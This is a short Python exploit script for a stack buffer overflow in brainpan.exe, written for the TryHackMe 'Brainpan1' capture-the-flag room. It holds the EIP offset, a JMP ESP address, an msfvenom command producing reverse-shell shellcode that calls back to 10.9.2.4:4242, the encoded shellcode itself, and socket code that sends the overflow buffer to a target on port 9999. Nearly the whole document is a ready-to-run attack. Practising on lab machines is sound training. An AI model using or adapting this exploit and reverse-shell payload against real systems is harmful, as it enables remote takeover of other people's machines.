#!/usr/bin/python

import socket
#CTF THM - Exploit BoF Brainpan1
#Autor - Izael Magalhaes
#28.06.2022
#EIP 519 - 005FDD89
#0x311712F3 = JMP ESP brainpan.exe
#Linux x86 - THM
#Buffer python -c 'print("A" * 520 + "BBBB" + "CCCC" + "D" * 350)'
#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.2.4 LPORT=4242 exitfunc=thread -b "\x00" -f py -v shellcode

#badchars \x00

#shellcode
shellcode =  b""
shellcode += b"\xbe\x94\x5d\xb2\x46\xdd\xc7\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x12\x31\x70\x12\x83\xc0\x04"
shellcode += b"\x03\xe4\x53\x50\xb3\x35\xb7\x63\xdf\x66\x04"
shellcode += b"\xdf\x4a\x8a\x03\x3e\x3a\xec\xde\x41\xa8\xa9"
shellcode += b"\x50\x7e\x02\xc9\xd8\xf8\x65\xa1\xd0\xf3\x97"
shellcode += b"\x35\x8d\x01\x98\x25\xdf\x8f\x79\xf5\xb9\xdf"
shellcode += b"\x28\xa6\xf6\xe3\x43\xa9\x34\x63\x01\x41\xa9"
shellcode += b"\x4b\xd5\xf9\x5d\xbb\x36\x9b\xf4\x4a\xab\x09"
shellcode += b"\x54\xc4\xcd\x1d\x51\x1b\x8d"

#buffer
buffer = "A" * 519 + "\xF3\x12\x17\x31" + "\x90" * 16 + shellcode

#conectando ao alvo
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.181.241",9999))
s.recv(1024)
s.send("SEND "+buffer+"\r\n")
